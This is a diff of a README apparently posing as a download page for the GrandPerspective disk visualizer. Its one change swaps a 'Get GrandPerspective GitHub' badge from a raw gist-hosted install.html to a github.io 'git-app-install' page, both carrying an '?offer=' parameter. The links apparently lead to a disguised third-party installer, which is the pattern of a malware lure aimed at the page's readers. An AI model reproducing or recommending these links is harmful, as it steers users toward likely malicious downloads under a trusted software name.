@@ -1,6 +1,6 @@
 # GrandPerspective Download — Desktop Storage Visualizer
 
-[![Get GrandPerspective GitHub](https://img.shields.io/badge/Get%20GrandPerspective%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/elforsrikepsix2007/9e59e4c937ee39214af39404141ea7af/raw/abdcbf392fc83fe4449934fd296e4a15c8ea6fc3/install.html?offer=GrandPerspective)
+[![Get GrandPerspective GitHub](https://img.shields.io/badge/Get%20GrandPerspective%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-install.github.io/.github/?offer=GrandPerspective)
 
 ---
 
